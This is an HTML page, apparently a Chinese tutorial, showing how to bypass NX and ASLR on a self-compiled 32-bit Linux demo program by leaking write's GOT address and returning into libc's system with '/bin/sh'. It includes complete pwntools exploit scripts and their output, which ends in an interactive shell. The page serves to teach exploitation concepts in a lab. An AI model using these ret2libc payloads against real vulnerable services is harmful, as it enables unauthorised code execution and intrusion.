@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>ROP绕过NX&ASLR（提供libc.so）</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+<style type="text/css">
+.highlight  { background: #ffffff; }
+.highlight .c { color: #999988; font-style: italic } /* Comment */
+.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
+.highlight .k { font-weight: bold } /* Keyword */
+.highlight .o { font-weight: bold } /* Operator */
+.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
+.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
+.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #aa0000 } /* Generic.Error */
+.highlight .gh { color: #999999 } /* Generic.Heading */
+.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
+.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
+.highlight .go { color: #888888 } /* Generic.Output */
+.highlight .gp { color: #555555 } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
+.highlight .gt { color: #aa0000 } /* Generic.Traceback */
+.highlight .kc { font-weight: bold } /* Keyword.Constant */
+.highlight .kd { font-weight: bold } /* Keyword.Declaration */
+.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
+.highlight .kr { font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
+.highlight .m { color: #009999 } /* Literal.Number */
+.highlight .s { color: #d14 } /* Literal.String */
+.highlight .na { color: #008080 } /* Name.Attribute */
+.highlight .nb { color: #0086B3 } /* Name.Builtin */
+.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
+.highlight .no { color: #008080 } /* Name.Constant */
+.highlight .ni { color: #800080 } /* Name.Entity */
+.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
+.highlight .nn { color: #555555 } /* Name.Namespace */
+.highlight .nt { color: #000080 } /* Name.Tag */
+.highlight .nv { color: #008080 } /* Name.Variable */
+.highlight .ow { font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mf { color: #009999 } /* Literal.Number.Float */
+.highlight .mh { color: #009999 } /* Literal.Number.Hex */
+.highlight .mi { color: #009999 } /* Literal.Number.Integer */
+.highlight .mo { color: #009999 } /* Literal.Number.Oct */
+.highlight .sb { color: #d14 } /* Literal.String.Backtick */
+.highlight .sc { color: #d14 } /* Literal.String.Char */
+.highlight .sd { color: #d14 } /* Literal.String.Doc */
+.highlight .s2 { color: #d14 } /* Literal.String.Double */
+.highlight .se { color: #d14 } /* Literal.String.Escape */
+.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
+.highlight .si { color: #d14 } /* Literal.String.Interpol */
+.highlight .sx { color: #d14 } /* Literal.String.Other */
+.highlight .sr { color: #009926 } /* Literal.String.Regex */
+.highlight .s1 { color: #d14 } /* Literal.String.Single */
+.highlight .ss { color: #990073 } /* Literal.String.Symbol */
+.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
+.highlight .vc { color: #008080 } /* Name.Variable.Class */
+.highlight .vg { color: #008080 } /* Name.Variable.Global */
+.highlight .vi { color: #008080 } /* Name.Variable.Instance */
+.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
+.pl-c {
+    color: #969896;
+}
+
+.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
+    color: #0086b3;
+}
+
+.pl-e,.pl-en {
+    color: #795da3;
+}
+
+.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
+    color: #333;
+}
+
+.pl-ent {
+    color: #63a35c;
+}
+
+.pl-k,.pl-s,.pl-st {
+    color: #a71d5d;
+}
+
+.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
+    color: #df5000;
+}
+
+.pl-id {
+    color: #b52a1d;
+}
+
+.pl-ii {
+    background-color: #b52a1d;
+    color: #f8f8f8;
+}
+
+.pl-sr .pl-cce {
+    color: #63a35c;
+    font-weight: bold;
+}
+
+.pl-ml {
+    color: #693a17;
+}
+
+.pl-mh,.pl-mh .pl-en,.pl-ms {
+    color: #1d3e81;
+    font-weight: bold;
+}
+
+.pl-mq {
+    color: #008080;
+}
+
+.pl-mi {
+    color: #333;
+    font-style: italic;
+}
+
+.pl-mb {
+    color: #333;
+    font-weight: bold;
+}
+
+.pl-md,.pl-mdhf {
+    background-color: #ffecec;
+    color: #bd2c00;
+}
+
+.pl-mdht,.pl-mi1 {
+    background-color: #eaffea;
+    color: #55a532;
+}
+
+.pl-mdr {
+    color: #795da3;
+    font-weight: bold;
+}
+
+.pl-mo {
+    color: #1d3e81;
+}
+.task-list {
+padding-left:10px;
+margin-bottom:0;
+}
+
+.task-list li {
+    margin-left: 20px;
+}
+
+.task-list-item {
+list-style-type:none;
+padding-left:10px;
+}
+
+.task-list-item label {
+font-weight:400;
+}
+
+.task-list-item.enabled label {
+cursor:pointer;
+}
+
+.task-list-item+.task-list-item {
+margin-top:3px;
+}
+
+.task-list-item-checkbox {
+display:inline-block;
+margin-left:-20px;
+margin-right:3px;
+vertical-align:1px;
+}
+</style>
+</head>
+<body>
+<h1 id="rop-nx-aslr-libc-so-">ROP绕过NX &amp; ASLR（提供libc.so）</h1>
+<p><strong>Author:wnagzihxa1n<br>E-Mail:wnagzihxa1n@gmail.com</strong></p>
+<p>开启ASLR</p>
+<pre><code>root@toT0C:/home/wnagzihxain# echo 2 &gt; /proc/sys/kernel/randomize_va_space
+root@toT0C:/home/wnagzihxain# exit
+exit
+wnagzihxain@toT0C:~$ cat /proc/sys/kernel/randomize_va_space
+2
+</code></pre><p>关闭栈保护模式编译</p>
+<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -o Demo Demo.c
+</code></pre><p>使用gdb调试，查看开启的保护，可以看到开了NX，ASLR上面已经打开了</p>
+<pre><code>gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre><p>前面说过，ASLR是说地址随机化，每次运行的内存地址都不一样，我们可以直观的来感受一下</p>
+<p>第一次运行</p>
+<pre><code>wnagzihxain@toT0C:~$ ps -aux |grep &quot;Demo&quot;
+wnagzih+  2504  0.5  3.2 276136 67264 ?        Ssl  07:54   1:11 /opt/sublime_text/sublime_text /home/wnagzihxain/Demo.c
+wnagzih+  4062  0.0  0.0   2068   548 pts/0    S+   11:28   0:00 ./Demo
+wnagzih+  4089  0.0  0.0   6872   812 pts/4    S+   11:30   0:00 grep --color=auto Demo
+wnagzihxain@toT0C:~$ cat /proc/4062/maps
+08048000-08049000 r-xp 00000000 08:01 2240964    /home/wnagzihxain/Demo
+08049000-0804a000 r--p 00000000 08:01 2240964    /home/wnagzihxain/Demo
+0804a000-0804b000 rw-p 00001000 08:01 2240964    /home/wnagzihxain/Demo
+b75c5000-b7775000 r-xp 00000000 08:01 1573314    /lib/i386-linux-gnu/libc-2.23.so
+b7775000-b7777000 r--p 001af000 08:01 1573314    /lib/i386-linux-gnu/libc-2.23.so
+b7777000-b7778000 rw-p 001b1000 08:01 1573314    /lib/i386-linux-gnu/libc-2.23.so
+b7778000-b777b000 rw-p 00000000 00:00 0 
+b7791000-b7793000 rw-p 00000000 00:00 0 
+b7793000-b7795000 r--p 00000000 00:00 0          [vvar]
+b7795000-b7797000 r-xp 00000000 00:00 0          [vdso]
+b7797000-b77b9000 r-xp 00000000 08:01 1573293    /lib/i386-linux-gnu/ld-2.23.so
+b77b9000-b77ba000 rw-p 00000000 00:00 0 
+b77ba000-b77bb000 r--p 00022000 08:01 1573293    /lib/i386-linux-gnu/ld-2.23.so
+b77bb000-b77bc000 rw-p 00023000 08:01 1573293    /lib/i386-linux-gnu/ld-2.23.so
+bfee5000-bff06000 rw-p 00000000 00:00 0          [stack]
+</code></pre><p>第二次运行</p>
+<pre><code>wnagzihxain@toT0C:~$ ps -aux |grep &quot;Demo&quot;
+wnagzih+  2504  0.5  3.2 276136 67264 ?        Ssl  07:54   1:12 /opt/sublime_text/sublime_text /home/wnagzihxain/Demo.c
+wnagzih+  4097  0.0  0.0   2068   540 pts/0    S+   11:32   0:00 ./Demo
+wnagzih+  4099  0.0  0.0   6872   800 pts/4    S+   11:32   0:00 grep --color=auto Demo
+wnagzihxain@toT0C:~$ cat /proc/4097/maps
+08048000-08049000 r-xp 00000000 08:01 2240964    /home/wnagzihxain/Demo
+08049000-0804a000 r--p 00000000 08:01 2240964    /home/wnagzihxain/Demo
+0804a000-0804b000 rw-p 00001000 08:01 2240964    /home/wnagzihxain/Demo
+b75a8000-b7758000 r-xp 00000000 08:01 1573314    /lib/i386-linux-gnu/libc-2.23.so
+b7758000-b775a000 r--p 001af000 08:01 1573314    /lib/i386-linux-gnu/libc-2.23.so
+b775a000-b775b000 rw-p 001b1000 08:01 1573314    /lib/i386-linux-gnu/libc-2.23.so
+b775b000-b775e000 rw-p 00000000 00:00 0 
+b7774000-b7776000 rw-p 00000000 00:00 0 
+b7776000-b7778000 r--p 00000000 00:00 0          [vvar]
+b7778000-b777a000 r-xp 00000000 00:00 0          [vdso]
+b777a000-b779c000 r-xp 00000000 08:01 1573293    /lib/i386-linux-gnu/ld-2.23.so
+b779c000-b779d000 rw-p 00000000 00:00 0 
+b779d000-b779e000 r--p 00022000 08:01 1573293    /lib/i386-linux-gnu/ld-2.23.so
+b779e000-b779f000 rw-p 00023000 08:01 1573293    /lib/i386-linux-gnu/ld-2.23.so
+bfc16000-bfc37000 rw-p 00000000 00:00 0          [stack]
+</code></pre><p>这里要结合蒸米湿敷那张图来看，程序并没有随机化</p>
+<pre><code>wnagzihxain@toT0C:~$ cat /proc/4062/maps
+08048000-08049000 r-xp 00000000 08:01 2240964    /home/wnagzihxain/Demo
+08049000-0804a000 r--p 00000000 08:01 2240964    /home/wnagzihxain/Demo
+0804a000-0804b000 rw-p 00001000 08:01 2240964    /home/wnagzihxain/Demo
+
+wnagzihxain@toT0C:~$ cat /proc/4097/maps
+08048000-08049000 r-xp 00000000 08:01 2240964    /home/wnagzihxain/Demo
+08049000-0804a000 r--p 00000000 08:01 2240964    /home/wnagzihxain/Demo
+0804a000-0804b000 rw-p 00001000 08:01 2240964    /home/wnagzihxain/Demo
+</code></pre><p>但是栈，堆，以及加载的库文件加载地址随机化了</p>
+<pre><code>b75c5000-b7775000 r-xp 00000000 08:01 1573314    /lib/i386-linux-gnu/libc-2.23.so
+b7775000-b7777000 r--p 001af000 08:01 1573314    /lib/i386-linux-gnu/libc-2.23.so
+b7777000-b7778000 rw-p 001b1000 08:01 1573314    /lib/i386-linux-gnu/libc-2.23.so
+b7778000-b777b000 rw-p 00000000 00:00 0 
+b7791000-b7793000 rw-p 00000000 00:00 0 
+b7793000-b7795000 r--p 00000000 00:00 0          [vvar]
+b7795000-b7797000 r-xp 00000000 00:00 0          [vdso]
+b7797000-b77b9000 r-xp 00000000 08:01 1573293    /lib/i386-linux-gnu/ld-2.23.so
+b77b9000-b77ba000 rw-p 00000000 00:00 0 
+b77ba000-b77bb000 r--p 00022000 08:01 1573293    /lib/i386-linux-gnu/ld-2.23.so
+b77bb000-b77bc000 rw-p 00023000 08:01 1573293    /lib/i386-linux-gnu/ld-2.23.so
+bfee5000-bff06000 rw-p 00000000 00:00 0          [stack]
+
+b75a8000-b7758000 r-xp 00000000 08:01 1573314    /lib/i386-linux-gnu/libc-2.23.so
+b7758000-b775a000 r--p 001af000 08:01 1573314    /lib/i386-linux-gnu/libc-2.23.so
+b775a000-b775b000 rw-p 001b1000 08:01 1573314    /lib/i386-linux-gnu/libc-2.23.so
+b775b000-b775e000 rw-p 00000000 00:00 0 
+b7774000-b7776000 rw-p 00000000 00:00 0 
+b7776000-b7778000 r--p 00000000 00:00 0          [vvar]
+b7778000-b777a000 r-xp 00000000 00:00 0          [vdso]
+b777a000-b779c000 r-xp 00000000 08:01 1573293    /lib/i386-linux-gnu/ld-2.23.so
+b779c000-b779d000 rw-p 00000000 00:00 0 
+b779d000-b779e000 r--p 00022000 08:01 1573293    /lib/i386-linux-gnu/ld-2.23.so
+b779e000-b779f000 rw-p 00023000 08:01 1573293    /lib/i386-linux-gnu/ld-2.23.so
+bfc16000-bfc37000 rw-p 00000000 00:00 0          [stack]
+</code></pre><p>那么这里开启了两种保护，一个是栈不可执行，另一个是地址随机化，栈不可执行我们依旧可以使用跳回<code>libc.so</code>的方法，对于地址随机化我们使用下面的方法进行绕过</p>
+<p>ELF文件使用一种叫延迟绑定的技术，有一个PLT表，有一个GOT表，比如<code>read</code>和<code>write</code>函数都是<code>libc.so</code>里的函数，那么如果一个ELF文件使用到了这两个函数，就需要有一个链接到<code>libc.so</code>文件相关函数地址的过程，这个过程简化一下就是当第一次调用到<code>read</code>函数时，会先跳到PLT表，PLT表跳到GOT表，此时GOT表不会有内容，会直接跳回PLT表，PLT表接下来的指令就是将此时内存中真实的<code>read</code>函数地址绑定到GOT表上，那么第二次调用<code>read</code>函数的时候，依旧先调用PLT表，然后PLT表跳到GOT表，此时GOT表已经有数据了，就不会跳回PLT表去执行绑定指令，而是直接调用<code>read</code>函数</p>
+<p>我们来看一下该ELF加载的<code>libc.so</code>文件路径</p>
+<pre><code>wnagzihxain@toT0C:~$ ldd Demo
+    linux-gate.so.1 =&gt;  (0xb7706000)
+    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7536000)
+    /lib/ld-linux.so.2 (0x80082000)
+</code></pre><p>把它拷贝到和我们编译的可执行文件同目录</p>
+<p>我们来输出<code>write</code>函数在GOT表中真实的地址，首先我们测试了返回地址的偏移是140个字节，那么结合前面说的延迟绑定，我们来构造的第一个Payload，输出此时内存中的<code>write</code>函数真实地址，因为我们这个程序使用到了<code>write</code>函数，所以我们在返回地址填充PLT表中<code>write</code>函数的地址，因为此时还没有调用到，所以它会先进行绑定的指令，然后再执行<code>write</code>函数，那么因为已经绑定了，所以<code>write</code>函数此时输出的GOT表中的<code>write</code>函数地址就是真实<code>write</code>函数的地址，输出后，我们返回到<code>Overflow</code>函数</p>
+<pre><code>#!/usr/bin/env python
+import pwn
+
+libc = pwn.ELF(&#39;libc.so&#39;)
+elf_Demo = pwn.ELF(&#39;Demo&#39;)
+
+attack = pwn.process(&#39;./Demo&#39;)
+# attack = remote(&#39;127.0.0.1&#39;, 23333)
+
+plt_write = elf_Demo.symbols[&#39;write&#39;]
+print &#39;###### plt_write = &#39; + hex(plt_write)
+
+got_write = elf_Demo.got[&#39;write&#39;]
+print &#39;###### got_write = &#39; + hex(got_write)
+
+overflow_addr = 0x08048471
+print &#39;###### overflow_addr = &#39; + hex(overflow_addr)
+
+payload = 140 * &#39;a&#39;
+payload += pwn.p32(plt_write)
+payload += pwn.p32(overflow_addr)
+payload += pwn.p32(1)
+payload += pwn.p32(got_write)
+payload += pwn.p32(4)
+
+print &quot;[1] Sending payload&quot;
+attack.send(payload)
+
+print &quot;[2] Receiving addr_write&quot;
+addr_write = pwn.u32(attack.recv(4))
+print &#39;addr_write = &#39; + hex(addr_write)
+</code></pre><p>跑起来后，我们可以看到真实<code>write</code>函数地址</p>
+<pre><code>[+] Starting local process &#39;./Demo&#39;: pid 6779
+###### plt_write = 0x8048320
+###### got_write = 0x804a014
+###### overflow_addr = 0x8048471
+[1] Sending payload
+[2] Receiving addr_write
+addr_write = 0xb7631b60
+</code></pre><p>那么我们拿到内存中<code>write</code>函数地址有什么用呢？</p>
+<p>系统在加载ELF文件的时候，函数之间的偏移是不会变的，如果我们拿到了该ELF程序使用的<code>libc.so</code>文件，那么我们就可以知道任何一个函数相对于<code>write</code>函数的偏移，或者是某些字符串，所以我们可以根据这点，先获取<code>system</code>函数和<code>/bin/sh</code>字符串相对于<code>write</code>函数的偏移，然后再和内存中<code>write</code>函数的地址进行计算，得到内存中<code>system</code>函数和<code>/bin/sh</code>字符串的地址</p>
+<p>有一点需要注意的是，前面一直强调ELF程序使用的<code>libc.so</code>版本，因为<code>libc.so</code>版本非常多，那么函数与函数之间相对的偏移也不一样，所以一定要对应好版本，这点会在后续进行详细介绍</p>
+<p>那么我们再次构造Payload，通过偏移计算需要的函数和字符串地址</p>
+<pre><code>#!/usr/bin/env python
+import pwn
+
+libc = pwn.ELF(&#39;libc.so&#39;)
+elf_Demo = pwn.ELF(&#39;Demo&#39;)
+
+attack = pwn.process(&#39;./Demo&#39;)
+# attack = remote(&#39;127.0.0.1&#39;, 23333)
+
+plt_write = elf_Demo.symbols[&#39;write&#39;]
+print &#39;###### plt_write = &#39; + hex(plt_write)
+
+got_write = elf_Demo.got[&#39;write&#39;]
+print &#39;###### got_write = &#39; + hex(got_write)
+
+overflow_addr = 0x08048471
+print &#39;###### overflow_addr = &#39; + hex(overflow_addr)
+
+payload = 140 * &#39;a&#39;
+payload += pwn.p32(plt_write)
+payload += pwn.p32(overflow_addr)
+payload += pwn.p32(1)
+payload += pwn.p32(got_write)
+payload += pwn.p32(4)
+
+print &quot;[1] Sending payload&quot;
+attack.send(payload)
+
+print &quot;[2] Receiving addr_write&quot;
+addr_write = pwn.u32(attack.recv(4))
+print &#39;addr_write = &#39; + hex(addr_write)
+
+print &quot;[3] Calculating addr_system and addr_binsh&quot;
+addr_system = addr_write - (libc.symbols[&#39;write&#39;] - libc.symbols[&#39;system&#39;])
+print &#39;addr_system = &#39; + hex(addr_system)
+addr_binsh = addr_write - (libc.symbols[&#39;write&#39;] - next(libc.search(&#39;/bin/sh&#39;)))
+print &#39;addr_binsh = &#39; + hex(addr_binsh)
+
+payload_final = 140 * &#39;a&#39;
+payload_final += pwn.p32(addr_system)
+payload_final += pwn.p32(overflow_addr)
+payload_final += pwn.p32(addr_binsh)
+
+print &quot;[4] Sending payload_final&quot;
+attack.send(payload_final)
+attack.interactive()
+</code></pre><p>效果如下</p>
+<pre><code>wnagzihxain@toT0C:~$ python Exp.py 
+[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
+[*] &#39;/home/wnagzihxain/libc.so&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] &#39;/home/wnagzihxain/Demo&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process &#39;./Demo&#39;: pid 6853
+###### plt_write = 0x8048320
+###### got_write = 0x804a014
+###### overflow_addr = 0x8048471
+[1] Sending payload
+[2] Receiving addr_write
+addr_write = 0xb767cb60
+[3] Calculating addr_system and addr_binsh
+addr_system = 0xb75e1da0
+addr_binsh = 0xb77029ab
+[4] Sending payload_final
+[*] Switching to interactive mode
+$ whoami
+wnagzihxain
+</code></pre><h2 id="references">References</h2>
+<ul>
+<li>蒸米-一步一步学ROP之linux_x86篇：<a href="http://jaq.alibaba.com/community/art/show?articleid=403">http://jaq.alibaba.com/community/art/show?articleid=403</a></li></ul>
+
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
